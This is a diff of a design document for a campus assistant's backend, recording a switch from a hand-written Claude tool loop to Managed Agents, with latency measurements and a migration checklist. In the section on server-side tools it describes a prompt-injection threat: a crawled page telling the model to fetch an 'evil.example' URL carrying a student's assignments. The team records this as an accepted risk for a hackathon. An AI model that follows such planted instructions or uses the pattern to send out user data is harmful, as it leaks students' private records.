@@ -13,10 +13,11 @@ query, decides which tools to call, calls them, and writes the reply.
 
 Read this if you read nothing else.
 
-1. **Write a manual agentic loop.** Not the SDK's tool runner. It can't resume
-   `pause_turn`, and that failure is silent.
+1. **Anthropic runs the loop — we're on Managed Agents.** Supersedes the earlier
+   decision to hand-write it. The `while` loop, `pause_turn` and parallel
+   batching stop being our code; tool execution stays ours.
 2. **Most of B4 already exists** in `apps/tools/registry.py`. We're writing the
-   loop, not the plumbing.
+   session client, not the plumbing.
 3. **Don't set `temperature`.** It's a 400 on our model.
 4. **Never put the current time in the system prompt.** It kills prompt caching.
    Time goes in the user turn.
@@ -48,68 +49,244 @@ Read this if you read nothing else.
 
 ---
 
-## Decision: manual loop, not the SDK tool runner
+## Decision: Managed Agents
 
-The Anthropic SDK ships a `tool_runner` that drives the loop for you. **We are
-not using it.** Four reasons, heaviest first:
+**Anthropic runs the loop.** We create a versioned agent once, open a session per
+thread, and our server executes the tools it asks for.
 
-| Reason | Detail |
+This supersedes the earlier decision to write the loop by hand. That decision was
+right about the SDK's `tool_runner` and wrong about the conclusion: the runner's
+problems are real, but the answer is the platform above it, not the loop below
+it. The industry default moved the same way — hand-rolling the loop now mostly
+buys maintenance, and the exception people name is a hard latency constraint,
+which is the one thing we should keep measuring (see [What it costs](#what-it-costs)).
+
+### The four surfaces
+
+| Surface | Runs the loop | Hosts it | Verdict |
+|---|---|---|---|
+| `messages.create` + our own loop | us | us | what exists today |
+| SDK `tool_runner` | SDK | us | **no** — cannot resume `pause_turn`, and fails silently when it hits one |
+| **Managed Agents** | **Anthropic** | **Anthropic** | **chosen** |
+| Claude Agent SDK | SDK | us | **no** — Claude Code as a library. Built-in Read/Write/Edit/Bash over a filesystem we don't have, custom tools only via MCP (re-wrapping a registry that already emits the right shape), and a shell in the process that ingests crawled pages |
+
+### What we stop maintaining
+
+| Ours today | Under CMA |
 |---|---|
-| **`pause_turn`** | A long web-search turn ends early with `stop_reason: "pause_turn"`. The Python runner **does not resume it** — it exits and hands back the paused turn as if finished. No error. The demo just silently truncates. In a manual loop this is 4 lines. |
-| **Our tools aren't decorated functions** | The runner wants `@beta_tool`-decorated functions. Our registry is plain functions + hand-written JSON schemas. We'd re-declare everything. |
-| **We need the transcript** | The runner keeps its own message list and won't show you. We need it to harvest citations and to build a partial answer on timeout. |
-| **It's beta** | The manual loop isn't. |
+| The `while` loop and `stop_reason` branching | Anthropic's |
+| `pause_turn` resume, `PLANNER_MAX_PAUSE_RESUMES` | gone — the platform owns it |
+| `ThreadPoolExecutor` dispatch, all-results-in-one-message | gone — the platform batches |
+| Context compaction on long threads | built in; we never built it |
+| Cancel | `user.interrupt`; we never built it |
+| An answer that dies with the HTTP connection | durable, resumable sessions |
+
+**That last row is the only one a student would feel.** Today `run_planner` is
+driven by the request, so a backgrounded app or a dead spot on the walk to Gates
+loses the whole turn — no server-side record, no `done` frame, retype the
+question and pay the 60 seconds again. On phones, which is the target platform,
+that is the real defect this fixes.
+
+### What it costs
+
+Two things get worse. Both have now been measured — see
+[What it actually cost](#what-it-actually-cost-measured-2026-08-15), where the
+first one turns out to be **the** number, not a footnote.
+
+| Cost | Detail |
+|---|---|
+| **A round trip per tool batch** | Our tools are custom tools, so each batch is `agent.custom_tool_use` → session goes idle → we execute → `user.custom_tool_result`. The signature multi-hop (Courses → Maps → Dining → Events) adds four hops that used to be in-process. |
+| **No `tool_choice: none` wrap-up** | The forced-prose ending isn't rebuildable at reasonable cost, so the wall-clock deadline goes away with it — see below. |
+
+Money is not one of the costs. Session running time is $0.08/hour billed on
+active seconds, so a 60-second answer is about **$0.0013**; model tokens and web
+search price the same as today. Watch token overhead instead: the built-in
+toolset loads bash/read/write/edit/glob/grep schemas into context whether or not
+we use them. **Decided: leave them on.** Not worth the config surface at demo
+scale — revisit only if measured overhead is material.
+
+### What it actually cost (measured 2026-08-15)
+
+**This is the number the migration was supposed to produce, and it is worse than
+the plan assumed.** Same query (the PRD §8 signature multi-hop), same machine,
+same model, cold start each time, `PLANNER_MANAGED_AGENTS` flipped between runs.
+
+B1–B3 have not landed, so the four campus lanes were stand-ins registered for the
+measurement: same shapes, same citation payloads, a deliberate 400 ms of latency
+each. That measures the dispatch path honestly and says nothing about how fast a
+real Courses API is.
+
+| | Manual loop (4 runs) | Managed Agents (6 runs) |
+|---|---|---|
+| **Total, median** | **13.3 s** | **37.9 s** |
+| Total, same 3-lane shape | 11.6 – 16.7 s | 24.8 – 28.9 s |
+| Total, range | 11.6 – 16.7 s | 24.8 – **86.5** s |
+| **Time to first `text_delta`, median** | **~7 s** | **~28 s** |
+| Tool calls per answer | 2 – 3 | 3 – 5 |
+
+Three things to take from it.
+
+1. **Roughly 2× slower on the same work, and ~4× slower to first token.** On an
+   identical 3-lane answer it is 25–29 s against 12–17 s. The gap is the round
+   trip per batch: each `agent.custom_tool_use` → idle → `user.custom_tool_result`
+   costs seconds that used to be a function call. Sequential dispatch (below)
+   accounts for under a second of it — the round trips are the cost.
+2. **The variance is worse than the median.** The manual loop ran 11.6–16.7 s
+   across every run and called the same three tools each time. Managed Agents
+   ranged 24.8–86.5 s and sometimes called the same lane twice. An 86-second
+   answer is a demo that looks broken.
+3. **Time to first token is what a person feels**, and it went from ~7 s to
+   ~28 s. `text_delta` still works — previews are opted into per stream with
+   `event_deltas=["agent.message"]` — but the first one now arrives after the
+   tool rounds rather than during the first turn.
+
+**Was the trade right?** Not on latency, and the honest answer is that the
+decision was made on maintenance and durability and should be re-read knowing the
+price. What was bought: no loop to maintain, no `pause_turn` handling, built-in
+compaction, and — the one a student would feel — an answer that survives a dead
+spot on the walk to Gates instead of dying with the HTTP connection.
+
+**Recommendation, for a human to decide:** keep Managed Agents, and treat the
+mitigations as B4 work rather than polish.
+
+- **Try `effort: low`.** It is an agent-version change, so it costs a
+  re-provision to test — but it is the single biggest lever and the routing here
+  is not deep reasoning.
+- **Reinstate parallel dispatch** if a real lane is slower than 400 ms. It was
+  removed on instruction and is a genuine regression for a parallel batch: three
+  400 ms tools now cost 1.2 s instead of 0.4 s.
+- **The fallback stays reachable.** `PLANNER_MANAGED_AGENTS=false` is one env
+  var, and on this evidence it is the safer demo-day setting if the numbers do
+  not improve. Do not delete `manual_loop.py` until they do.
+
+### Decided: no wall-clock deadline
+
+Today every limit ends the same way: one more call with
+`tool_choice: {"type": "none"}`, forcing prose out of whatever came back. A
+session has no `tool_choice`, and `user.interrupt` reports `stop_reason:
+end_turn` — the same value a turn that finished normally carries — so the drain
+loop cannot even tell "I stopped this" from "it was done." Rebuilding the forced
+ending would cost an interrupt **plus** a follow-up `user.message` asking for a
+summary: an extra model turn, on the one path that exists because we have already
+run out of time.
+
+**So we drop it.** The deadline existed because a slow answer held an HTTP
+connection that would eventually die with nothing to show for it. A session
+outlives the connection — a slow answer is resumable rather than lost, which is
+strictly better than truncated prose. `PLANNER_DEADLINE_SECONDS` goes away.
+
+Two consequences worth stating out loud:
+
+- **A recorded requirement changes.** Tasklist B4's "timeout + graceful partial
+  answer if one tool hangs" is no longer met the way it was written. The failure
+  mode it guarded against — one hung upstream costing the whole answer — is now
+  handled by resumability instead of by partial prose.
+- **`note` loses its main producer.** It still carries tool failures; it no
+  longer carries "we ran out of time."
+
+**Still bound the runaway case.** Nothing above stops a tool loop from spinning.
+A session `budget` is the replacement — dollar-denominated, which never fitted a
+deadline in seconds but fits a cost ceiling exactly. Set one.
+
+### What does not change
+
+- **Tool execution stays ours.** Custom tools run in Django against Postgres and
+  the campus APIs. Anthropic never sees pgvector, the OpenAI embeddings, or a
+  Canvas token.
+- **The per-request toolset survives.** `tools_for_session()` still computes it;
+  it is passed at session create inside an `agent_with_overrides` reference.
+  Overrides replace in full, which is exactly the shape that function returns.
+- **Citations survive.** We produce every custom-tool result, so `CitationLedger`
+  harvests from the same data as today.
+- **Our SSE endpoint stays.** CMA's event stream is server-to-server under our
+  API key and cannot be handed to the app. Django reads that stream and re-emits
+  `mode_start` / `text_delta` / `done`, so the §2 contract is untouched.
+- **Every invariant in [architecture.md](./architecture.md) holds.** Both of the
+  load-bearing ones are enforced in `run_tool`, which still runs on our side.
 
 ---
 
-## The loop, step by step
+## The shape, step by step
+
+Three objects, on two very different lifecycles. **The agent and the environment
+are created once and their IDs stored** — creating an agent per request is the
+canonical way to get this wrong: it orphans agent objects, pays create latency on
+every query, and defeats the versioning the platform exists to give you.
+
+| Object | Created | Lives in |
+|---|---|---|
+| **Agent** — model, system prompt, base toolset | once, versioned | `PLANNER_AGENT_ID` |
+| **Environment** — the container template | once | `PLANNER_ENVIRONMENT_ID` |
+| **Session** — one conversation | per thread | `Thread.cma_session_id` |
 
 ```
 backend/apps/planner/
-├── client.py      # Anthropic client, model/effort/timeout config
-├── prompt.py      # system prompt (frozen) + volatile user-turn preamble
-├── loop.py        # ← the actual loop
-├── citations.py   # tool results → Citation dicts
-└── errors.py      # PlannerError → the API error shape
+├── client.py      # CMA client; agent + environment IDs from env
+├── provision.py   # ← new: create/update the agent and environment, run by hand
+├── prompt.py      # system prompt (frozen) — now lives on the agent
+├── loop.py        # ← now a session driver, not a loop
+├── citations.py   # tool results → Citation dicts (unchanged)
+└── errors.py      # PlannerError → the API error shape (unchanged)
 ```
 
-Then `AskView.post` shrinks to: validate → `run_planner(...)` → serialize.
+`AskView.post` is unchanged: validate → `run_planner(...)` → serialize.
+`run_planner` stays a generator yielding the same events.
 
-**The loop:**
+**Per turn:**
 
-1. Build the **tools array** from `tools_for_session(session_id)`.
-2. Build the **system prompt** — frozen, cacheable, no timestamps.
-3. Build **messages** = `history` + user turn. The user turn carries the query
-   *and* the volatile preamble (current date/time, timezone).
-4. Call `messages.create`.
-5. **`stop_reason == "end_turn"`** → done, go to 10.
-6. **`stop_reason == "pause_turn"`** → append the assistant turn, call again,
-   back to 5. (Cap the resumes.)
-7. **`stop_reason == "tool_use"`** → collect *every* `tool_use` block, run them
-   (thread pool), append the assistant content, then append **one** user message
-   containing **all** the `tool_result` blocks.
-8. **Harvest citations** from those tool results, and from any
-   `web_search_tool_result` / `web_fetch_tool_result` blocks in the assistant
-   content.
-9. **Check the deadline and the iteration cap.** Over either → one final call
-   with `tool_choice: {"type": "none"}`, which forces prose out of what it has.
-10. Extract text → validate markers → build payload → `AskResponseSerializer`.
+1. **Resolve the session.** New thread → `sessions.create`; existing thread →
+   reuse `Thread.cma_session_id`.
+2. **Pass this request's toolset** as an `agent_with_overrides` reference —
+   `{type: "agent_with_overrides", id: PLANNER_AGENT_ID, tools: [...]}`, built
+   from `tools_for_session(session_id)`. Overrides replace in full.
+3. **Open the event stream, then send the `user.message`** carrying the query and
+   the volatile preamble (date/time, timezone). Order matters — see below.
+4. **Drain the stream:**
+   - `agent.message` → forward text as `text_delta`
+   - `agent.custom_tool_use` → note the lane, emit `mode_start`
+   - `session.status_idle` with `stop_reason.type == "requires_action"` → the
+     session is waiting on us: dispatch each pending call through `run_tool`,
+     send back one `user.custom_tool_result` per call, keep draining
+   - `session.status_idle` with any other `stop_reason`, or
+     `session.status_terminated` → done
+5. **Harvest citations** from our own tool results before returning them, and
+   from web-search blocks on `agent.message`.
+6. Extract text → validate markers → build payload → `AskResponseSerializer`.
+
+**Two ordering traps in step 3.** The stream only delivers events emitted *after*
+it opens, and there is no replay — so open it first, then send. That rules out
+the tempting shortcut of passing `initial_events` to `sessions.create`, which
+starts the agent at create time and races your stream. And on reconnect, list the
+session's events and dedupe by event id before tailing, or you silently lose
+whatever happened during the gap.
+
+**One idle is not done.** A session goes idle transiently every time it wants a
+tool result. Breaking on `session.status_idle` alone hangs the answer at the
+first tool call; the `stop_reason` is what distinguishes them.
 
 ---
 
 ## Model settings
 
-We're on **`claude-sonnet-5`** (`PLANNER_MODEL`). Three things about this model
-that will bite:
+We're on **`claude-sonnet-5`** (`PLANNER_MODEL`). **These now live on the agent
+object, not on the request** — which is the point of the versioning, and also the
+trap below.
 
 | Setting | Do this | Why |
 |---|---|---|
 | `temperature` / `top_p` / `top_k` | **Don't set them at all** | Non-default values are a **400** on this model. Steer with the prompt. |
-| `thinking` | **Omit it** — adaptive is on by default | Disabling thinking makes the model *less* likely to call tools. That's the opposite of what a routing planner wants. And `budget_tokens` is a 400. |
-| `output_config.effort` | Start at `"medium"`, env-configurable | Default is `high`. For tool routing, medium is plenty and it's our main latency lever. |
+| `thinking` | **Omit it** — adaptive is on by default | Disabling thinking makes the model *less* likely to call tools, the opposite of what a routing planner wants. And `budget_tokens` is a 400. |
+| `effort` | `model: {id: "claude-sonnet-5", effort: "medium"}` on the agent | Default is `high`. For tool routing, medium is plenty and it's our main latency lever. |
 
-`max_tokens`: keep at or below **16000**. The contract is non-streaming
-(frozen decision), and above ~16k the SDK starts refusing non-streaming calls.
+> ⚠️ **`effort` inside a per-session `model` override is silently ignored.** It is
+> the one overridable field that fails quietly instead of erroring, so a session
+> that "sets" effort just runs at the agent's. To change it you update the agent
+> — which means a new agent version, and `PLANNER_EFFORT` stops being a per-request
+> env knob. Tune it by re-provisioning, not per request.
+
+`max_tokens` stops being ours to set — the session owns generation. The old
+16000 ceiling existed because of non-streaming SDK limits on a call we no longer
+make.
 
 ---
 
@@ -147,34 +324,71 @@ tool_use/tool_result pairing and the API rejects the next call.
 Doing it right is also what makes "degrade, don't crash" real: the model reads
 the error and routes around a dead upstream mid-answer.
 
-### 4. Server-side tools don't fit the registry
+### 4. Server-side tools stop being ours to declare
 
-`web_search` and `web_fetch` run on **Anthropic's** servers. We declare them but
-never execute them, and their output arrives as blocks inside the *assistant*
-message.
+`web_search` and `web_fetch` are part of `agent_toolset_20260401`, so they arrive
+by enabling the toolset rather than by declaring a tool. Three of the four rules
+that used to matter here are now the platform's problem, and one new question
+replaces them.
 
-So:
-- the registry needs an `is_server_tool` flag → declare, never dispatch
-- `citations.py` needs a second path for those blocks
-- `modes_used` gets `web_verify` from a `server_tool_use` block, not from
-  `run_tool`
-
-**This is B4's job, not B3's.** B3 owns the domain allow/deny lists.
-
-Four non-obvious rules come with them:
-
-| Rule | Consequence if ignored |
+| Rule | Now |
 |---|---|
-| **Append assistant content back byte-for-byte.** Search results carry an `encrypted_content` field. | Missing or modified → **400 validation error** on the next call. Never reconstruct assistant blocks; append what you got. |
-| **Mixing our tools and theirs in one turn defers the search.** If the model calls `campus_search` *and* `web_search` in the same parallel batch, you get `stop_reason: "tool_use"` and the search **has not run yet**. | A loop that assumes "tool_use means only my tools ran" mishandles the turn. Return our results; the API runs the search on the next request. |
-| **Errors arrive as HTTP 200.** A failed search is a `web_search_tool_result_error` object inside `content`, with codes like `max_uses_exceeded`, `too_many_requests`, `unavailable`. | Uncaught → crash on a rate limit. Note `content` is an *object* on error and a *list* on success — branch before indexing. |
-| **Set `response_inclusion: "excluded"`** on `web_search_20260318`. | Otherwise raw search content is echoed back in the response, and we pay output tokens for text we never show. |
+| Append assistant content back byte-for-byte (`encrypted_content`) | **Gone** — the session holds its own history, so there is no assistant turn for us to reconstruct. This also retires the follow-up limitation in [Open questions](#open-questions). |
+| Mixing our tools and theirs in one turn defers the search | **Gone** — the platform sequences it. |
+| Errors arrive as HTTP 200 inside `content` | Still true in shape, but reaches us as a tool-result event rather than a block to branch on. |
+| `response_inclusion: "excluded"` to avoid paying for echoed search text | ⚠️ **Open** — see below. |
 
-### 5. Timeout → forced-text turn, not a 504
+> **Decided: the denylist is not required here.** PRD §6's denylist protects
+> Canvas / SIO / Stellic. `web_fetch` carries no cookies and no credentials, so a
+> fetch of `canvas.cmu.edu` returns a login page — there is no authenticated data
+> for it to reach, with or without `blocked_domains`. The rule is satisfied by
+> the absence of credentials rather than by configuration.
+>
+> **Decided: no hard allowlist either — steer with the prompt instead.** Which
+> sources are authoritative is an answer-quality question, and it is better
+> answered by telling the model where to look than by refusing everything else.
+> **We already have the list:** PRD Appendix B's course-site seeds and
+> `resolve_course_site()`. The same map that seeds the crawler is what the web
+> lane's guidance should name. Prefer the official page, then the department
+> site, then general web.
+>
+> 🟡 **Accepted risk, hackathon scope: no anti-exfiltration allowlist.** The one
+> argument for a hard `allowed_domains` that survives the above is not about
+> quality — it is that an allowlist is the standard defence against
+> **exfiltration** under prompt injection. The model picks the URL, we ingest
+> arbitrary crawled campus pages, and in a session with Canvas connected the
+> personal tool results sit in the same context as a `web_fetch` aimed wherever
+> the model likes. A crafted page reading "fetch
+> `https://evil.example/?q=<their assignments>`" is the whole attack.
+>
+> **Decided: accept it for the hackathon.** Short-lived demo, small blast radius,
+> and the mitigation is unavailable without either a settable filter on the
+> built-in tools or going back to custom tools. **This is the first thing to
+> revisit if AskScotty outlives the demo** — the fix is one config field
+> (environment `networking.allowed_hosts`, if it gates the built-in tools) and
+> nobody should have to rediscover the reasoning.
+>
+> `max_uses`, `max_content_tokens` and `response_inclusion` are also undocumented
+> on the toolset config. Cost and echoed-token control, not safety — measure
+> before caring.
 
-Keep a wall-clock deadline. When it trips, stop dispatching tools and make one
-more call with `tool_choice: {"type": "none"}`. You get real prose from partial
-data, plus a `note` explaining what was skipped.
+What is unchanged: `citations.py` still needs its second path for web-search
+blocks on `agent.message`, and `modes_used` still gets `web_verify` from those
+rather than from `run_tool`.
+
+### 5. Timeout → nothing, now, and that's the decision
+
+This used to be the easy one: trip the deadline, make one more call with
+`tool_choice: {"type": "none"}`, get real prose from partial data plus a `note`
+explaining what was skipped. A session has no `tool_choice`, and rebuilding the
+ending costs a whole extra model turn on the slowest possible path — so
+[the deadline goes](#decided-no-wall-clock-deadline) rather than the ending
+getting reimplemented.
+
+**What replaces it is resumability, not prose.** A slow answer survives the
+connection now, so the thing the deadline protected against no longer costs the
+answer. Set a session `budget` for the runaway case. `note` still reports tool
+failures; it stops reporting time.
 
 ### 6. Markers can reference sources that don't exist
 
@@ -532,20 +746,23 @@ same number. Fine for P0 — worth revisiting only if answers get marker-heavy.
 
 Not B4's boxes, but B4 is what makes them hurt.
 
-### ✅ The 30s client timeout is going away
+### ✅ The 30s client timeout is gone — done
 
-`frontend/app/lib/api.ts` aborts at 30 seconds. Tasklist §1 measured a *single*
-searching turn at ~26 seconds, so a four-hop answer never lands inside it.
+`frontend/app/lib/api.ts` used to abort at 30 seconds. Tasklist §1 measured a
+*single* searching turn at ~26 seconds, so a four-hop answer never landed inside
+it. **Shipped:** `TIMEOUT_MS = 120_000` — a backstop long enough for a real
+multi-hop, short enough that a genuinely hung request still fails rather than
+spinning forever.
 
-**Decided: remove it.** Keep a much longer backstop (~2 min) so a genuinely hung
-request still fails rather than spinning forever.
+That fixed *failing*. It did nothing for *feeling slow* — which is what SSE
+below is for.
 
-That fixes *failing*. It does nothing for *feeling slow* — see below.
-
-### 🟢 Web tool version strings — checked, tasklist is correct
+### 🟢 Web tool version strings — checked twice, tasklist is correct
 
 `web_search_20260318` / `web_fetch_20260318` are current. There are three
-versions and `_20260318` is the newest:
+versions and `_20260318` is the newest — **re-confirmed against the live docs
+2026-08-15**, because a cached reference listed `_20260209` as newest and it is
+not:
 
 | Version | Adds |
 |---|---|
@@ -568,18 +785,16 @@ separating before anyone builds:
 
 | # | Thing | Status |
 |---|---|---|
-| 1 | **Client timeout** — request fails at 30s | ✅ decided: remove it |
-| 2 | **Backend ↔ Anthropic** — we call `messages.stream()` internally | 🟢 do it, no contract change, invisible to the app |
-| 3 | **Backend ↔ app** — SSE to the client | ✅ **we want this** — build it |
+| 1 | **Client timeout** — request failed at 30s | ✅ **done** — `TIMEOUT_MS = 120_000` in `lib/api.ts` |
+| 2 | **Backend ↔ Anthropic** — `messages.stream()` internally | ✅ **done** — no contract change, invisible to the app |
+| 3 | **Backend ↔ app** — SSE to the client | ✅ **done** — `POST /api/ask/stream/`, `askEvents()` |
 
-**(2) is free and we should just do it.** Long turns risk HTTP timeouts on the
-non-streaming path, and the SDK refuses large `max_tokens` without streaming.
-Nothing about our API contract changes — the loop still returns one payload.
+**All three shipped.** What follows is kept as the reasoning, not as a plan —
+(3) was the one that needed a decision, because tasklist §1 had frozen
+"Streaming: no" for P0 with "revisit only if the demo feels slow, and agree SSE
+here first." That revisit happened, and §1 now carries the amendment.
 
-**(3) is the one that needs a decision**, because tasklist §1 froze "Streaming:
-no" for P0 with "revisit only if the demo feels slow, and agree SSE here first."
-
-### Two things make (3) cheaper than it looks
+### Two things made (3) cheaper than it looked
 
 **The frontend is already shaped for it.** `createHttpAdapter` is
 `async *run(...)` — an async *generator* that happens to yield exactly once
@@ -676,6 +891,10 @@ growing `responseText` from a saved offset and split on `\n\n`.
 `ToolError`, which is the same path a real outage takes — so the degrade logic
 gets exercised from day one.
 
+### Built on the manual loop — working today
+
+Kept as the fallback until the migration is proven end to end.
+
 - [x] `client.py` — Anthropic client, config from env
 - [x] `prompt.py` — system prompt + user-turn preamble
 - [x] `loop.py` — the loop, ending at `end_turn`, with the iteration cap
@@ -684,12 +903,132 @@ gets exercised from day one.
 - [x] Marker validation
 - [x] `pause_turn` resume
 - [x] Deadline → forced-text final turn
-- [ ] Server-tool support (`is_server_tool`, result-block parsing) — deferred with
-      B3: it cannot be tested before the lane exists
 - [x] Parallel dispatch (`ThreadPoolExecutor`)
 - [x] SSE: `POST /api/ask/stream/`, and `askEvents()` on the app side
+
+### Migration to Managed Agents
+
+**Nothing blocks the start.** Both former blockers are settled: the wall-clock
+deadline [goes away](#decided-no-wall-clock-deadline), and the denylist is
+[satisfied by the absence of credentials](#4-server-side-tools-stop-being-ours-to-declare)
+rather than by config.
+
+- [x] `provision.py` — shipped as `manage.py provision_planner`, a management
+      command that creates **or updates** the agent and environment and prints
+      their IDs. Run by hand, out of band. Updating is the normal path: a changed
+      system prompt mints a new agent *version* under the same ID. **The request
+      path never calls `agents.create` — it calls `sessions.create` and points at
+      the stored ID**
+- [x] Session `budget` on create — `PLANNER_SESSION_BUDGET_CENTS`, default 500
+      ($5.00). Note it caps a whole **thread**, not one question: the session is
+      per thread and `budget` is create-only, so a per-turn number would strand a
+      long conversation at `budget_reached` with only a budget update to free it
+- [x] Source-preference guidance in the agent's system prompt — already there in
+      `prompt.py` ("Which source to prefer"), provisioned with the agent
+- [x] `PLANNER_AGENT_ID` / `PLANNER_ENVIRONMENT_ID` in settings and `.env.example`
+      — and, the part that was missing, in `docker-compose.yml`. Compose lists
+      every variable individually, so ids copied faithfully into `.env` still
+      never reached the container and every question failed "not provisioned"
+- [x] **Bootstrap:** `setup.sh` runs provisioning (step 4/6), and an unprovisioned
+      backend now says so twice — a `manage.py check` warning at every startup,
+      and a hard request-time failure naming the command. Never self-provisions
+- [x] Prune `.env.example` and settings — see [Which knobs survived](#which-knobs-survived)
+- [x] `Thread.cma_session_id` + migration (`core.0002`)
+- [x] `client.py` → CMA client
+- [x] `loop.py` → session driver: stream-first, `requires_action` dispatch through
+      `run_tool`, same yielded events
+- [x] Reconnect: list events and dedupe by id before tailing
+- [x] `citations.py` — unchanged, and see [Citations](#citations-unchanged-with-one-caveat-for-b3)
+      for the one thing that changed underneath it
+- [x] `tests.py` — rebuilt against a scripted **event stream**; the fallback's
+      scripted-model tests moved to `tests_manual_loop.py` so a reachable loop
+      stays a tested one. 58 tests green
+- [x] Delete `PLANNER_MAX_PAUSE_RESUMES`, `PLANNER_DEADLINE_SECONDS` and the
+      `ThreadPoolExecutor`
 - [ ] Re-test against each real tool as its lane lands
-- [ ] Signature multi-hop, end to end, cold start
+- [x] Signature multi-hop, end to end, cold start — with stand-in lanes, since
+      B1–B3 have not landed
+- [x] **Measure the round-trip cost** against the manual loop on the same query —
+      [it is 2× slower, and ~4× to first token](#what-it-actually-cost-measured-2026-08-15)
+
+### Which knobs survived
+
+| Setting | Verdict |
+|---|---|
+| `PLANNER_MAX_TOKENS` | **Gone.** The session owns generation. |
+| `PLANNER_DEADLINE_SECONDS` | **Gone.** Replaced by the session budget. |
+| `PLANNER_MAX_PAUSE_RESUMES` | **Gone.** The platform owns `pause_turn`. |
+| `PLANNER_MAX_ITERATIONS` | **Gone.** A second bound on top of the budget would end the turn with no prose to show for it, which is the failure the deadline was dropped to avoid. The budget is the bound. |
+| `PLANNER_REQUEST_TIMEOUT` | **Kept, new job.** Control-plane calls only — open a session, send events, list events. The event stream sets its own 900 s ceiling, because 45 s would cut a long answer in half. |
+| `PLANNER_MAX_RETRIES` | **Kept.** The SDK still retries 429/5xx on those same short calls. |
+| `PLANNER_CITATION_MARKERS` | **Kept, and load-bearing.** The agent is provisioned with the marker rules unconditionally; `loop.py` still strips them while the setting is off. That is what makes F2 an env flip instead of a re-provision. |
+| `PLANNER_SESSION_BUDGET_CENTS` | **New.** The runaway bound. |
+| `PLANNER_MANAGED_AGENTS` | **New.** The way back to `manual_loop.py`. Delete both together. |
+
+### Four things the build turned up
+
+**1. One idle is not done — and the obvious reading of that rule is still wrong.**
+The plan says to check `stop_reason` and dispatch on `requires_action`. It does
+not say what to do about a `requires_action` idle when *nothing of ours is
+outstanding*, and the intuitive answer — the session must be stuck, stop — is
+wrong. A session idles again while it works through results you have already
+sent. Treating that as the end of the turn truncates every multi-hop answer to
+nothing: tools run, citations collect, and the reader gets the no-answer
+fallback. Keep draining, and only stop if `stop_reason.event_ids` names something
+you never saw asked. There is a regression test for this.
+
+**2. Overrides replace in full — including the toolset you did not mean to
+touch.** `agent_with_overrides` with a `tools` array of just our custom tools
+silently removes `web_search` and `web_fetch`, because those arrive via
+`agent_toolset_20260401` and the override replaced it. The array has to list the
+prebuilt toolset again.
+
+**3. "No tools available" stopped being a real state.** The user turn had a
+branch for an empty toolset — with none registered, the model tried to satisfy
+"everything factual comes from a tool" by writing a tool call out as prose. Under
+Managed Agents the prebuilt toolset always carries the web pair, so that branch
+now *talks the model out of the one lane it has*. The session driver never sends
+it; `manual_loop.py` still does, correctly.
+
+**4. A stale session id has to be survivable.** `Thread.cma_session_id` is a
+second store. A session archived or deleted on Anthropic's side leaves the row
+pointing at nothing, and a 404 on someone's follow-up is not an acceptable
+answer. The driver opens a new session instead — the conversation loses its
+memory, not the answer. Pre-flighting with a `retrieve` was rejected: a round
+trip on every follow-up to catch a case that needs a deletion to happen.
+
+### Citations: unchanged, with one caveat for B3
+
+`citations.py` needed **no changes**, as predicted — the ledger harvests from our
+own tool results, and those still arrive through `run_tool`. Confirmed against a
+live session: three lanes, three citations, ids `S1`–`S3`, `is_mock` stamped from
+the producing tool.
+
+The caveat is for B3, and it is a shape change rather than a scope change. The
+plan says `citations.py` needs a second path for "web-search blocks on
+`agent.message`". Under Managed Agents there are no such blocks: an
+`agent.message` event carries `text` and `redacted` blocks only, and the web
+results arrive on a separate `agent.tool_result` event keyed by `tool_use_id`.
+So the second harvest path reads events, not content blocks. Until it exists, a
+web-verified answer still earns its `web_verify` chip (the driver reads that from
+the tool-use events) but contributes no citations, and `note` correctly says no
+campus source backed it.
+
+### The one contract question this raised
+
+**`thread_id` is a new optional field on the ask request.** The §2 contract was
+meant to be untouched, and this is the one place it could not be: `Thread.cma_session_id`
+is unreachable without knowing which thread a question belongs to, and the ask
+body carried `query`, `session_id` and `history` only. Without it the column is
+dead and "follow-ups reuse the session" cannot happen.
+
+It is additive and optional (`default=""`): a client that omits it gets a fresh
+session per question and a byte-identical response, which is exactly the
+pre-migration behaviour. Response shapes and every SSE event are unchanged. The
+app now sends it, read from the `activeThreadIdRef` that already existed.
+
+**Worth a second opinion** if "no contract change" was meant literally rather
+than "don't break the app".
 
 **One thing the plan did not anticipate.** With *no* tools registered — today's
 state — a prompt that says "everything factual comes from a tool" makes the model
@@ -725,16 +1064,35 @@ Zero new dependencies. Everything needed is RN core + react-native-web.
 
 ## Open questions
 
-- **Effort level.** Starting at `medium`. Needs measuring against real
-  multi-hop once B2's tools exist.
-- **History depth.** Contract allows 40 turns. Do we send all of them, or
-  truncate? Long histories are the main uncontrolled cost here.
-- **Web-search context doesn't survive a follow-up.** Our `history` contract is
-  `[{role, content: string}]` — plain text. The `encrypted_content` that lets
-  Anthropic restore search results into context only survives if you replay the
-  original content *blocks*, which our contract flattens away. So "is that still
-  current?" as a follow-up re-searches from scratch rather than reusing the
-  previous turn's results. Acceptable for P0; note it before anyone treats
-  follow-ups as cheap.
+- 🟡 **Exfiltration via `web_fetch` — accepted for the hackathon, not solved.**
+  Not open in the sense of undecided; open in the sense that the decision has an
+  expiry date. First thing to revisit post-demo. See
+  [§4](#4-server-side-tools-stop-being-ours-to-declare).
+- **What bounds a runaway loop now.** A session `budget` is the plan, but nobody
+  has picked a number. It wants to be generous enough that a legitimate
+  multi-hop never trips it and small enough to matter.
+- **Effort level.** Starting at `medium`. Now an agent-version change rather than
+  an env knob, so measuring it costs a re-provision.
+- **Who owns conversation state.** A session per thread makes CMA the second
+  store alongside `Thread`/`Message`. Ours stays authoritative for what the app
+  renders; the session is what the model sees. Worth deciding explicitly before
+  they drift — particularly what happens when a session is archived or deleted
+  and the thread isn't.
 - **Marker density.** One per sentence, or one per claim? Too many markers make
   the prose unreadable; too few make the citations decorative.
+
+### ✅ Closed
+
+- **The deadline ending.** Was: how do we force prose out of partial data without
+  `tool_choice: none`? Answer: we don't — the wall-clock deadline goes, and
+  resumability replaces it.
+- **A denylist for the built-in web tools.** Was: can the toolset carry
+  `blocked_domains`, and does §6 fail without it? Answer: §6 is satisfied by the
+  absence of credentials — `web_fetch` cannot reach authenticated pages at all.
+- **History depth.** Was: send all 40 turns or truncate? Compaction is built in,
+  so the session manages its own context.
+- **Web-search context doesn't survive a follow-up.** Was: our flattened
+  `[{role, content: string}]` history drops the `encrypted_content` that lets
+  Anthropic restore search results, so "is that still current?" re-searched from
+  scratch. A session holds its own history in full, so follow-ups reuse the
+  previous turn's results.
